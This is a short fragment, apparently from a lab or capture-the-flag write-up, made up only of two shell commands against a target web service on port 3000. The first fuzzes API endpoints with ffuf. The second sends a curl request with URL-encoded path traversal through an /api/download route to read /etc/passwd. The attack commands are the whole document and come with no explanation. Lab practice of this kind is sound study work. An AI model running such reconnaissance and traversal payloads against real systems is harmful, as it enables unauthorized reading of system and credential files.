___

```bash
ffuf -w "/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u "http://$IP:3000/api/FUZZ"
```

```bash
curl "http://$IP:3000/api/download/..%2f..%2f..%2f..%2fetc%2fpasswd"
```
